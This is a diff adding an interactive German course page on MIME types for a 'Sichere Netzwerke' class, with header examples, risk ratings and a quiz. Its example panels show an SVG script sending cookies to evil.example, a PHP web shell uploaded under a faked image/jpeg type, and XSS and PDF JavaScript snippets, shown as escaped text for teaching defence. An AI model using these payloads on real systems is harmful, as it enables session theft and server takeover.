@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MIME-Types – Sichere Netzwerke | FOM</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@3.7.0/dist/tabler-icons.min.css">
+<style>
+:root {
+  --bg: #0f1117;
+  --bg2: #161b27;
+  --bg3: #1e2436;
+  --border: rgba(255,255,255,0.08);
+  --border2: rgba(255,255,255,0.15);
+  --text: #e8eaf0;
+  --text2: #8b92a8;
+  --text3: #555d74;
+  --blue: #4a9eff;
+  --blue-bg: rgba(74,158,255,0.12);
+  --green: #3dd68c;
+  --green-bg: rgba(61,214,140,0.12);
+  --amber: #f5a623;
+  --amber-bg: rgba(245,166,35,0.12);
+  --red: #ff5f5f;
+  --red-bg: rgba(255,95,95,0.12);
+  --purple: #a78bfa;
+  --purple-bg: rgba(167,139,250,0.12);
+  --pink: #f472b6;
+  --pink-bg: rgba(244,114,182,0.12);
+  --teal: #2dd4bf;
+  --teal-bg: rgba(45,212,191,0.12);
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'Courier New', Courier, monospace;
+  min-height: 100vh;
+}
+header {
+  border-bottom: 1px solid var(--border);
+  padding: 1.25rem 2rem;
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  background: var(--bg2);
+}
+.logo-badge {
+  background: var(--blue-bg);
+  border: 1px solid rgba(74,158,255,0.3);
+  color: var(--blue);
+  padding: 4px 10px;
+  border-radius: 4px;
+  font-size: 11px;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+}
+header h1 {
+  font-size: 14px;
+  color: var(--text);
+  font-weight: normal;
+  letter-spacing: 0.5px;
+}
+header .sub {
+  font-size: 12px;
+  color: var(--text3);
+  margin-left: auto;
+}
+.layout {
+  display: grid;
+  grid-template-columns: 220px 1fr;
+  min-height: calc(100vh - 60px);
+}
+.sidebar {
+  background: var(--bg2);
+  border-right: 1px solid var(--border);
+  padding: 1.5rem 0;
+  display: flex;
+  flex-direction: column;
+  gap: 2px;
+}
+.sidebar-section {
+  padding: 0.5rem 1rem 0.25rem;
+  font-size: 10px;
+  letter-spacing: 1.5px;
+  text-transform: uppercase;
+  color: var(--text3);
+  margin-top: 0.75rem;
+}
+.sidebar-section:first-child { margin-top: 0; }
+.cat-btn {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 8px 1rem;
+  cursor: pointer;
+  font-size: 12px;
+  color: var(--text2);
+  border: none;
+  background: none;
+  text-align: left;
+  width: 100%;
+  border-left: 2px solid transparent;
+  transition: all .15s;
+  font-family: inherit;
+}
+.cat-btn:hover { background: var(--bg3); color: var(--text); }
+.cat-btn.active { border-left-color: var(--blue); background: var(--blue-bg); color: var(--blue); }
+.cat-btn i { font-size: 14px; }
+.main {
+  display: grid;
+  grid-template-columns: 260px 1fr;
+}
+.mime-list-col {
+  border-right: 1px solid var(--border);
+  padding: 1.25rem 0;
+  overflow-y: auto;
+  max-height: calc(100vh - 60px);
+}
+.mime-item {
+  padding: 10px 1.25rem;
+  cursor: pointer;
+  border-left: 2px solid transparent;
+  transition: all .12s;
+}
+.mime-item:hover { background: var(--bg3); }
+.mime-item.selected { border-left-color: var(--green); background: rgba(61,214,140,0.07); }
+.mime-item .mname {
+  font-size: 12px;
+  color: var(--text);
+  font-family: 'Courier New', monospace;
+  font-weight: bold;
+}
+.mime-item.selected .mname { color: var(--green); }
+.mime-item .mdesc {
+  font-size: 11px;
+  color: var(--text3);
+  margin-top: 2px;
+}
+.detail-col {
+  padding: 2rem;
+  overflow-y: auto;
+  max-height: calc(100vh - 60px);
+  display: flex;
+  flex-direction: column;
+  gap: 1.5rem;
+}
+.empty-state {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  height: 100%;
+  gap: 12px;
+  color: var(--text3);
+}
+.empty-state i { font-size: 36px; }
+.empty-state p { font-size: 13px; }
+.detail-title {
+  font-size: 20px;
+  color: var(--text);
+  font-family: 'Courier New', monospace;
+  font-weight: bold;
+}
+.detail-sub { font-size: 13px; color: var(--text2); margin-top: 4px; }
+.section-label {
+  font-size: 10px;
+  letter-spacing: 1.5px;
+  text-transform: uppercase;
+  color: var(--text3);
+  margin-bottom: 8px;
+}
+.anatomy-box {
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem 1.25rem;
+}
+.anatomy-row {
+  display: flex;
+  align-items: center;
+  gap: 0;
+  font-family: 'Courier New', monospace;
+  font-size: 15px;
+  margin-bottom: 6px;
+}
+.atype { background: rgba(74,158,255,0.2); color: var(--blue); padding: 4px 10px; border-radius: 4px 0 0 4px; font-weight: bold; }
+.aslash { padding: 4px 4px; color: var(--text3); }
+.asub { background: rgba(61,214,140,0.2); color: var(--green); padding: 4px 10px; border-radius: 0 4px 4px 0; font-weight: bold; }
+.aparam { color: var(--text3); font-size: 12px; padding: 4px 8px; }
+.anat-labels { display: flex; gap: 0; font-size: 10px; margin-top: 4px; color: var(--text3); letter-spacing: 0.5px; }
+.al-type { min-width: 60px; padding: 0 10px; color: rgba(74,158,255,0.6); }
+.al-sub { padding: 0 10px; color: rgba(61,214,140,0.6); }
+.http-box {
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem 1.25rem;
+  font-family: 'Courier New', monospace;
+  font-size: 12px;
+}
+.hkey { color: var(--blue); font-weight: bold; }
+.hval { color: var(--green); }
+.use-text { font-size: 13px; color: var(--text2); line-height: 1.7; }
+.badge-row { display: flex; gap: 8px; flex-wrap: wrap; }
+.badge {
+  padding: 4px 12px;
+  border-radius: 4px;
+  font-size: 11px;
+  font-weight: bold;
+  letter-spacing: 0.5px;
+}
+.b-low { background: var(--green-bg); color: var(--green); border: 1px solid rgba(61,214,140,0.3); }
+.b-med { background: var(--amber-bg); color: var(--amber); border: 1px solid rgba(245,166,35,0.3); }
+.b-high { background: var(--red-bg); color: var(--red); border: 1px solid rgba(255,95,95,0.3); }
+.preview-box {
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  overflow: hidden;
+}
+.preview-header {
+  background: rgba(255,255,255,0.04);
+  border-bottom: 1px solid var(--border);
+  padding: 8px 1.25rem;
+  font-size: 10px;
+  letter-spacing: 1.5px;
+  text-transform: uppercase;
+  color: var(--text3);
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+.dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
+pre.pcode {
+  padding: 1rem 1.25rem;
+  font-family: 'Courier New', monospace;
+  font-size: 12px;
+  color: var(--text);
+  white-space: pre-wrap;
+  word-break: break-all;
+  line-height: 1.7;
+}
+.swatch-row { padding: 1rem 1.25rem; display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
+.swatch { width: 44px; height: 44px; border-radius: 4px; border: 1px solid var(--border); }
+.swatch-note { font-size: 11px; color: var(--text3); line-height: 1.6; max-width: 300px; }
+
+/* QUIZ */
+.quiz-section {
+  background: var(--bg2);
+  border-top: 1px solid var(--border);
+  padding: 1.5rem 2rem;
+  margin-top: auto;
+}
+.quiz-box {
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1.25rem;
+}
+.quiz-q { font-size: 13px; color: var(--text); margin-bottom: 1rem; line-height: 1.6; }
+.quiz-q strong { color: var(--amber); }
+.quiz-opts { display: flex; flex-direction: column; gap: 6px; }
+.quiz-opt {
+  padding: 8px 14px;
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  font-size: 12px;
+  font-family: 'Courier New', monospace;
+  cursor: pointer;
+  color: var(--text2);
+  background: none;
+  text-align: left;
+  transition: all .12s;
+}
+.quiz-opt:hover { border-color: var(--border2); color: var(--text); background: rgba(255,255,255,0.04); }
+.quiz-opt.correct { border-color: var(--green); background: var(--green-bg); color: var(--green); }
+.quiz-opt.wrong { border-color: var(--red); background: var(--red-bg); color: var(--red); }
+.quiz-feedback { margin-top: 10px; font-size: 12px; line-height: 1.6; padding: 8px 12px; border-radius: 4px; display: none; }
+.quiz-feedback.show { display: block; }
+.quiz-feedback.ok { background: var(--green-bg); color: var(--green); border: 1px solid rgba(61,214,140,0.3); }
+.quiz-feedback.fail { background: var(--red-bg); color: var(--red); border: 1px solid rgba(255,95,95,0.3); }
+.quiz-reset {
+  margin-top: 10px;
+  padding: 6px 14px;
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  font-size: 11px;
+  color: var(--text3);
+  background: none;
+  cursor: pointer;
+  font-family: inherit;
+  display: none;
+}
+.quiz-reset.show { display: inline-block; }
+.quiz-reset:hover { color: var(--text2); border-color: var(--border2); }
+</style>
+</head>
+<body>
+<header>
+  <span class="logo-badge">FOM</span>
+  <h1>Sichere Netzwerke — MIME-Typen</h1>
+  <span class="sub">SS 2026 · Interaktive Lernkarte</span>
+</header>
+
+<div class="layout">
+  <div class="sidebar" id="sidebar"></div>
+  <div class="main">
+    <div class="mime-list-col" id="mimeListCol"></div>
+    <div class="detail-col" id="detailCol">
+      <div class="empty-state">
+        <i class="ti ti-hand-click"></i>
+        <p>MIME-Typ in der Liste auswählen</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+const CATS = [
+  {id:'text', label:'text/*', icon:'ti-file-text', color:'var(--blue)'},
+  {id:'image', label:'image/*', icon:'ti-photo', color:'var(--green)'},
+  {id:'audio', label:'audio/*', icon:'ti-music', color:'var(--amber)'},
+  {id:'video', label:'video/*', icon:'ti-video', color:'var(--pink)'},
+  {id:'application', label:'application/*', icon:'ti-file-code', color:'var(--purple)'},
+  {id:'multipart', label:'multipart/*', icon:'ti-stack-2', color:'var(--teal)'},
+];
+
+const MIMES = [
+  {cat:'text',sub:'html',full:'text/html',desc:'Webseiten-Markup',
+   header:'Content-Type: text/html; charset=utf-8',param:'charset=utf-8',
+   use:'Browser rendert HTML direkt. Standard für alle Webseiten im WWW.',
+   risk:'med',riskLabel:'Mittel – kann Scripts enthalten (XSS)',
+   preview:'code',
+   code:'<span style="color:var(--blue)">&lt;h1&gt;</span>Willkommen<span style="color:var(--blue)">&lt;/h1&gt;</span>\n<span style="color:var(--blue)">&lt;p&gt;</span>Dies ist eine <span style="color:var(--green)">&lt;strong&gt;</span>HTML<span style="color:var(--green)">&lt;/strong&gt;</span>-Seite.<span style="color:var(--blue)">&lt;/p&gt;</span>\n<span style="color:var(--red)">&lt;script&gt;</span>alert(\'XSS\')<span style="color:var(--red)">&lt;/script&gt;</span>\n<span style="color:var(--text3)">↑ Browser führt Script aus!</span>'},
+  {cat:'text',sub:'plain',full:'text/plain',desc:'Reiner Text ohne Formatierung',
+   header:'Content-Type: text/plain; charset=utf-8',param:'charset=utf-8',
+   use:'Logs, einfache Textdateien. Browser zeigt rohen Text an – kein Rendering.',
+   risk:'low',riskLabel:'Niedrig – kein ausführbarer Inhalt',
+   preview:'code',
+   code:'Hallo Welt!\nDies ist reiner Text.\nKeine HTML-Tags werden interpretiert.\n\n&lt;script&gt;alert(1)&lt;/script&gt;  ← wird als Text angezeigt'},
+  {cat:'text',sub:'css',full:'text/css',desc:'Cascading Style Sheets',
+   header:'Content-Type: text/css',param:'',
+   use:'Stylesheets für Webseiten. Kein eigenständiger Script-Kontext.',
+   risk:'low',riskLabel:'Niedrig – kein Script-Kontext',
+   preview:'code',
+   code:'body  { font-family: Arial; }\nh1    { color: #4a9eff; font-size: 24px; }\np     { line-height: 1.6; }'},
+  {cat:'text',sub:'csv',full:'text/csv',desc:'Kommagetrennte Tabellendaten',
+   header:'Content-Type: text/csv; charset=utf-8',param:'charset=utf-8',
+   use:'Datenaustausch zwischen Systemen, Tabellenkalkulationen.',
+   risk:'low',riskLabel:'Niedrig – reines Textformat',
+   preview:'code',
+   code:'Name,IP-Adresse,Status\nRouter-01,10.0.1.1,aktiv\nSwitch-02,10.0.1.2,inaktiv\nFirewall,10.0.1.254,aktiv'},
+  {cat:'image',sub:'png',full:'image/png',desc:'Verlustfreie Bilddatei',
+   header:'Content-Type: image/png',param:'',
+   use:'Logos, Screenshots, Grafiken mit Transparenz. Browser rendert direkt als Bild.',
+   risk:'low',riskLabel:'Niedrig – binäres Format',
+   preview:'swatch',
+   swatches:['#4a9eff','#3dd68c','#f5a623','#a78bfa']},
+  {cat:'image',sub:'jpeg',full:'image/jpeg',desc:'Komprimiertes Foto-Format',
+   header:'Content-Type: image/jpeg',param:'',
+   use:'Fotos, komplexe Bilder. Verlustbehaftet, deutlich kleiner als PNG.',
+   risk:'low',riskLabel:'Niedrig – keine Script-Ausführung',
+   preview:'swatch',
+   swatches:['#f5a623','#3dd68c','#f472b6','#4a9eff']},
+  {cat:'image',sub:'svg+xml',full:'image/svg+xml',desc:'Vektorgrafik (XML-basiert)',
+   header:'Content-Type: image/svg+xml',param:'',
+   use:'Skalierbare Grafiken – ACHTUNG: SVG ist XML und kann JavaScript einbetten!',
+   risk:'high',riskLabel:'HOCH – kann eingebettetes JavaScript enthalten',
+   preview:'code',
+   code:'&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;\n  &lt;circle cx="50" cy="50" r="40"\n          fill="#4a9eff"/&gt;\n\n  &lt;!-- Angreifer kann einbetten: --&gt;\n  <span style="color:var(--red)">&lt;script&gt;fetch(\'https://evil.example/\'+document.cookie)&lt;/script&gt;</span>\n&lt;/svg&gt;\n\n<span style="color:var(--amber)">⚠ Daher SVGs niemals direkt aus Nutzereingaben ausliefern!</span>'},
+  {cat:'audio',sub:'mpeg',full:'audio/mpeg',desc:'MP3-Audiodaten',
+   header:'Content-Type: audio/mpeg',param:'',
+   use:'Audiodateien, Podcasts. Browser nutzt nativen Audio-Player.',
+   risk:'low',riskLabel:'Niedrig – reines Audioformat',
+   preview:'code',
+   code:'HTTP/1.1 200 OK\n< Content-Type: audio/mpeg\n< Content-Length: 4194304\n< Accept-Ranges: bytes\n\n[Binärdaten — nicht als Text darstellbar]\n\nHTML:\n&lt;audio src="podcast.mp3" controls&gt;&lt;/audio&gt;'},
+  {cat:'audio',sub:'ogg',full:'audio/ogg',desc:'Offenes Ogg-Containerformat',
+   header:'Content-Type: audio/ogg',param:'',
+   use:'Open-Source Alternative zu MP3. Verwendet Vorbis oder Opus Codec.',
+   risk:'low',riskLabel:'Niedrig',
+   preview:'code',
+   code:'Format:  Ogg-Container\nCodec:   Vorbis / Opus\nEinsatz: Browser-nativer Audio-Stream\n\n&lt;audio src="podcast.ogg" controls&gt;&lt;/audio&gt;'},
+  {cat:'video',sub:'mp4',full:'video/mp4',desc:'MPEG-4 Videodatei',
+   header:'Content-Type: video/mp4',param:'',
+   use:'Videostreaming, HTML5-Video. Verbreitetstes Webvideoformat weltweit.',
+   risk:'low',riskLabel:'Niedrig – kein Script-Kontext',
+   preview:'code',
+   code:'Format:      MPEG-4 Container\nVideo-Codec: H.264 / H.265\nAudio-Codec: AAC\n\n&lt;video src="demo.mp4" controls&gt;&lt;/video&gt;'},
+  {cat:'video',sub:'webm',full:'video/webm',desc:'Offenes WebM-Videoformat',
+   header:'Content-Type: video/webm',param:'',
+   use:'Open-Source-Alternative zu MP4, entwickelt von Google für das Web.',
+   risk:'low',riskLabel:'Niedrig',
+   preview:'code',
+   code:'Format:      WebM Container\nVideo-Codec: VP8 / VP9 / AV1\nAudio-Codec: Vorbis / Opus\n\n&lt;video src="clip.webm" controls&gt;&lt;/video&gt;'},
+  {cat:'application',sub:'json',full:'application/json',desc:'JSON-Daten (REST-APIs)',
+   header:'Content-Type: application/json',param:'',
+   use:'REST-APIs, Konfigurationsdateien. Browser zeigt rohen JSON-Text an.',
+   risk:'low',riskLabel:'Niedrig – kein ausführbarer Inhalt',
+   preview:'code',
+   code:'{\n  "user": "alice",\n  "role": "admin",\n  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",\n  "expires": 1719792000\n}'},
+  {cat:'application',sub:'pdf',full:'application/pdf',desc:'Portable Document Format',
+   header:'Content-Type: application/pdf',param:'',
+   use:'Dokumente. Browser öffnet eingebetteten PDF-Viewer. Kann JavaScript enthalten!',
+   risk:'med',riskLabel:'Mittel – PDF-JavaScript-Angriffe bekannt',
+   preview:'code',
+   code:'%PDF-1.7\n1 0 obj\n&lt;&lt; /Type /Catalog /Pages 2 0 R &gt;&gt;\nendobj\n...\n\n<span style="color:var(--amber)">⚠ PDF kann JavaScript via /JavaScript-Annotation enthalten.\nBeispielsweise: &lt;&lt; /S /JavaScript /JS (app.alert(1)) &gt;&gt;</span>'},
+  {cat:'application',sub:'octet-stream',full:'application/octet-stream',desc:'Beliebige Binärdaten (Fallback)',
+   header:'Content-Type: application/octet-stream',param:'',
+   use:'Fallback für unbekannte Dateitypen. Browser startet Download – kein Rendering.',
+   risk:'low',riskLabel:'Niedrig – Browser erzwingt Download-Dialog',
+   preview:'code',
+   code:'HTTP/1.1 200 OK\nContent-Type: application/octet-stream\nContent-Disposition: attachment; filename="data.bin"\n\n[Binärdaten]\n\n<span style="color:var(--green)">→ Browser zeigt "Speichern unter"-Dialog\n→ Sicherer Fallback für unbekannte Formate</span>'},
+  {cat:'application',sub:'x-www-form-urlencoded',full:'application/x-www-form-urlencoded',desc:'HTML-Formulardaten (kodiert)',
+   header:'Content-Type: application/x-www-form-urlencoded',param:'',
+   use:'Standard-POST-Formulare. Schlüssel-Wert-Paare URL-kodiert im Request-Body.',
+   risk:'med',riskLabel:'Mittel – CSRF-Angriffe ohne Preflight möglich',
+   preview:'code',
+   code:'POST /login HTTP/1.1\nHost: bank.example\nContent-Type: application/x-www-form-urlencoded\n\nusername=alice&password=geheim123&remember=on\n\n<span style="color:var(--amber)">⚠ CSRF: Browser sendet diesen Typ automatisch\nohne CORS-Preflight!</span>'},
+  {cat:'multipart',sub:'form-data',full:'multipart/form-data',desc:'Formulare mit Datei-Upload',
+   header:'Content-Type: multipart/form-data; boundary=----FormBound7MA4YWx',param:'boundary=----FormBound7MA4YWx',
+   use:'Datei-Uploads via HTML-Formular. Jeder Teil hat eigenen Content-Type – dieser kann gefälscht werden!',
+   risk:'high',riskLabel:'HOCH – MIME-Typ clientseitig fälschbar',
+   preview:'code',
+   code:'------FormBound7MA4YWx\nContent-Disposition: form-data;\n  name="file"; filename="shell.php"\n<span style="color:var(--red)">Content-Type: image/jpeg</span>  ← gefälscht!\n\n<span style="color:var(--red)">&lt;?php system($_GET[\'cmd\']); ?&gt;</span>\n------FormBound7MA4YWx--\n\n<span style="color:var(--amber)">⚠ Server MUSS Dateiinhalt prüfen,\nnicht nur den Content-Type-Header!</span>'},
+  {cat:'multipart',sub:'mixed',full:'multipart/mixed',desc:'Gemischte E-Mail-Inhalte',
+   header:'Content-Type: multipart/mixed; boundary=NextPart',param:'boundary=NextPart',
+   use:'E-Mail mit Text und Anhängen. Basis des MIME-E-Mail-Standards (RFC 2045).',
+   risk:'med',riskLabel:'Mittel – Phishing- und Malware-Anhänge',
+   preview:'code',
+   code:'MIME-Version: 1.0\nContent-Type: multipart/mixed; boundary="NextPart"\n\n--NextPart\nContent-Type: text/plain\n\nBitte öffnen Sie den Anhang.\n\n--NextPart\nContent-Type: application/octet-stream\nContent-Disposition: attachment;\n  filename="rechnung.exe"\n\n[Binärdaten]\n--NextPart--'},
+];
+
+const QUIZ = [
+  {
+    q:'Welcher MIME-Typ kann trotz einer Bild-Dateiendung JavaScript enthalten und ausführen?',
+    opts:['image/png','image/jpeg','image/svg+xml','image/webp'],
+    correct:2,
+    fb:'Richtig! <strong>image/svg+xml</strong> ist XML-basiert und erlaubt &lt;script&gt;-Elemente. Browser führen dieses JS aus, wenn die SVG direkt eingebettet wird. PNG und JPEG sind Binärformate ohne Script-Kontext.'
+  },
+  {
+    q:'Ein Angreifer lädt eine PHP-Shell hoch, setzt aber <strong>Content-Type: image/jpeg</strong>. Was sollte der Server tun?',
+    opts:['Den Content-Type Header akzeptieren und die Datei als Bild speichern','Den Dateiinhalt (Magic Bytes) prüfen, nicht nur den Header','Die Datei ablehnen, weil .php-Endung angegeben ist','Die Datei ohne Prüfung in /uploads speichern'],
+    correct:1,
+    fb:'Richtig! Der Server muss den <strong>Dateiinhalt</strong> validieren (Magic Bytes, Signatur-Check). Der Content-Type Header wird vom Client gesendet und kann trivial gefälscht werden. Dieser Angriff ist ein klassisches File-Upload-Bypass-Szenario.'
+  },
+  {
+    q:'Welcher MIME-Typ erzwingt beim Browser einen Download-Dialog anstatt das Dokument zu rendern?',
+    opts:['application/json','text/plain','application/octet-stream','application/pdf'],
+    correct:2,
+    fb:'Richtig! <strong>application/octet-stream</strong> ist der "sichere Fallback" – der Browser kennt keinen Renderer dafür und öffnet den "Speichern unter"-Dialog. Server können diesen Typ bewusst setzen, um ungewolltes Rendering zu verhindern.'
+  }
+];
+
+let activeCat = 'text';
+let selectedMime = null;
+let quizIdx = 0;
+let quizAnswered = false;
+
+function renderSidebar(){
+  const sb = document.getElementById('sidebar');
+  sb.innerHTML = '<div class="sidebar-section">Kategorien</div>' +
+    CATS.map(c=>`<button class="cat-btn ${c.id===activeCat?'active':''}" onclick="selectCat('${c.id}')">
+      <i class="ti ${c.icon}"></i>${c.label}
+    </button>`).join('');
+}
+
+function renderList(){
+  const items = MIMES.filter(m=>m.cat===activeCat);
+  document.getElementById('mimeListCol').innerHTML =
+    items.map(m=>`<div class="mime-item ${selectedMime===m.full?'selected':''}" onclick="selectMime('${m.full}')">
+      <div class="mname">${m.full}</div>
+      <div class="mdesc">${m.desc}</div>
+    </div>`).join('');
+}
+
+function renderDetail(m){
+  const dc = document.getElementById('detailCol');
+  const paramRow = m.param?`<span class="aslash">;</span><span class="aparam"> ${m.param}</span>`:'';
+  const riskCls = m.risk==='low'?'b-low':m.risk==='med'?'b-med':'b-high';
+  let previewInner='';
+  if(m.preview==='code'){
+    previewInner=`<pre class="pcode">${m.code}</pre>`;
+  } else {
+    previewInner=`<div class="swatch-row">
+      ${m.swatches.map(c=>`<div class="swatch" style="background:${c}"></div>`).join('')}
+      <span class="swatch-note">Bilddaten als Binär-Bytes gespeichert – kein Text, kein Script möglich.</span>
+    </div>`;
+  }
+
+  const q = QUIZ[quizIdx];
+  const optHtml = q.opts.map((o,i)=>`<button class="quiz-opt" id="qo${i}" onclick="answerQuiz(${i})">${o}</button>`).join('');
+
+  dc.innerHTML = `
+    <div>
+      <div class="detail-title">${m.full}</div>
+      <div class="detail-sub">${m.desc}</div>
+    </div>
+    <div class="anatomy-box">
+      <div class="section-label">Aufbau des MIME-Types</div>
+      <div class="anatomy-row">
+        <span class="atype">${m.cat}</span>
+        <span class="aslash">/</span>
+        <span class="asub">${m.sub}</span>
+        ${paramRow}
+      </div>
+      <div class="anat-labels">
+        <span class="al-type">Haupttyp</span>
+        <span class="al-sub">Subtyp</span>
+      </div>
+    </div>
+    <div class="http-box">
+      <div class="section-label">HTTP-Header Beispiel</div>
+      <span class="hkey">Content-Type: </span><span class="hval">${m.header.replace('Content-Type: ','')}</span>
+    </div>
+    <div>
+      <div class="section-label">Verwendung</div>
+      <div class="use-text">${m.use}</div>
+    </div>
+    <div>
+      <div class="section-label">Sicherheitsrelevanz</div>
+      <div class="badge-row"><span class="badge ${riskCls}">${m.riskLabel}</span></div>
+    </div>
+    <div class="preview-box">
+      <div class="preview-header">
+        <span class="dot" style="background:var(--red)"></span>
+        <span class="dot" style="background:var(--amber)"></span>
+        <span class="dot" style="background:var(--green)"></span>
+        &nbsp; Inhalt / Beispiel
+      </div>
+      ${previewInner}
+    </div>
+    <div style="border-top:1px solid var(--border);padding-top:1.5rem">
+      <div class="section-label" style="color:var(--amber)">Quizfrage ${quizIdx+1} / ${QUIZ.length}</div>
+      <div class="quiz-box">
+        <div class="quiz-q">${q.q}</div>
+        <div class="quiz-opts">${optHtml}</div>
+        <div class="quiz-feedback" id="qfb"></div>
+        <button class="quiz-reset" id="qreset" onclick="nextQuiz()">Nächste Frage →</button>
+      </div>
+    </div>`;
+  quizAnswered=false;
+}
+
+function answerQuiz(i){
+  if(quizAnswered) return;
+  quizAnswered=true;
+  const q=QUIZ[quizIdx];
+  const fb=document.getElementById('qfb');
+  const reset=document.getElementById('qreset');
+  for(let j=0;j<q.opts.length;j++){
+    const el=document.getElementById('qo'+j);
+    if(j===q.correct) el.classList.add('correct');
+    else if(j===i) el.classList.add('wrong');
+  }
+  fb.innerHTML=q.fb;
+  fb.className='quiz-feedback show '+(i===q.correct?'ok':'fail');
+  reset.className='quiz-reset show';
+}
+
+function nextQuiz(){
+  quizIdx=(quizIdx+1)%QUIZ.length;
+  if(selectedMime){
+    const m=MIMES.find(x=>x.full===selectedMime);
+    if(m) renderDetail(m);
+  }
+}
+
+function selectCat(id){
+  activeCat=id;
+  selectedMime=null;
+  renderSidebar();
+  renderList();
+  document.getElementById('detailCol').innerHTML=`<div class="empty-state"><i class="ti ti-hand-click"></i><p>MIME-Typ in der Liste auswählen</p></div>`;
+}
+
+function selectMime(full){
+  selectedMime=full;
+  renderList();
+  const m=MIMES.find(x=>x.full===full);
+  if(m) renderDetail(m);
+}
+
+renderSidebar();
+renderList();
+</script>
+</body>
+</html>
